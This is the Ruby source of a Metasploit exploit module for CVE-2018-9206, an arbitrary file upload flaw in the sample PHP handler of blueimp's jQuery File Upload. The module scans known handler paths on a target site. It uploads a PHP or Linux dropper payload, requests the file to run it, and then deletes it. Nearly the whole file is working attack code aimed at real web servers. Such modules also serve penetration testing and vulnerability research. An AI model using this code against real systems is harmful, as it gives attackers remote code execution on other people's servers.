##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "blueimp's jQuery (Arbitrary) File Upload",
      'Description'    => %q{
        This module exploits an arbitrary file upload in the sample PHP upload
        handler for blueimp's jQuery File Upload widget in versions <= 9.22.0.

        Due to a default configuration in Apache 2.3.9+, the widget's .htaccess
        file may be disabled, enabling exploitation of this vulnerability.

        This vulnerability has been exploited in the wild since at least 2015
        and was publicly disclosed to the vendor in 2018.
      },
      'Author'         => [
        'Claudio Viviani',     # WordPress Work the Flow (Arbitrary) File Upload
        'Larry W. Cashdollar', # (Re)discovery, vendor disclosure, and PoC
        'wvu'                  # Metasploit module
      ],
      'References'     => [
        ['CVE', '2018-9206'],
        ['URL', 'http://www.vapidlabs.com/advisory.php?v=204'],
        ['URL', 'https://github.com/blueimp/jQuery-File-Upload/pull/3514'],
        ['URL', 'https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206'],
        ['URL', 'https://www.homelab.it/index.php/2015/04/04/wordpress-work-the-flow-file-upload-vulnerability/'],
        ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5130']
      ],
      'DisclosureDate' => 'Oct 9 2018', # Larry's disclosure to the vendor
      'License'        => MSF_LICENSE,
      'Platform'       => ['php', 'linux'],
      'Arch'           => [ARCH_PHP, ARCH_X86, ARCH_X64],
      'Privileged'     => false,
      'Targets'        => [
        ['PHP Dropper',   'Platform' => 'php',   'Arch' => ARCH_PHP],
        ['Linux Dropper', 'Platform' => 'linux', 'Arch' => [ARCH_X86, ARCH_X64]]
      ],
      'DefaultTarget'  => 0
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/jQuery-File-Upload'])
    ])
  end

  # List from PoC sorted by frequency
  def upload_paths
    %w[
      /server/php/index.php
      /server/php/upload.class.php
      /server/php/UploadHandler.php
      /example/upload.php
      /php/index.php
    ].map { |u| normalize_uri(target_uri.path, u) }
  end

  def check
    upload_paths.each do |u|
      vprint_status("Checking #{u}")

      res = send_request_cgi(
        'method' => 'GET',
        'uri'    => u
      )

      if res && res.code == 200
        vprint_good("Found #{u}")
        @u = u
        return CheckCode::Detected
      end
    end

    CheckCode::Safe
  end

  def exploit
    unless check == CheckCode::Detected
      fail_with(Failure::NotFound, 'Could not find target')
    end

    f = "#{rand_text_alphanumeric(8..42)}.php"
    u = normalize_uri(File.dirname(@u), 'files', f)

    print_status('Uploading payload')
    res = upload_payload(f)

    unless res && res.code == 200 && res.body.include?(f)
      fail_with(Failure::NotVulnerable, 'Could not upload payload')
    end

    print_good("Payload uploaded: #{full_uri(u)}")

    print_status('Executing payload')
    exec_payload(u)

    print_status('Deleting payload')
    delete_payload(f)
  end

  def upload_payload(f)
    p = get_write_exec_payload(unlink_self: true)

    m = Rex::MIME::Message.new
    m.add_part(p, nil, nil, %(form-data; name="files[]"; filename="#{f}"))

    send_request_cgi(
      'method' => 'POST',
      'uri'    => @u,
      'ctype'  => "multipart/form-data; boundary=#{m.bound}",
      'data'   => m.to_s
    )
  end

  def exec_payload(u)
    send_request_cgi({
      'method' => 'GET',
      'uri'    => u
    }, 1)
  end

  def delete_payload(f)
    send_request_cgi(
      'method'   => 'DELETE',
      'uri'      => @u,
      'vars_get' => {'file' => f}
    )
  end

end
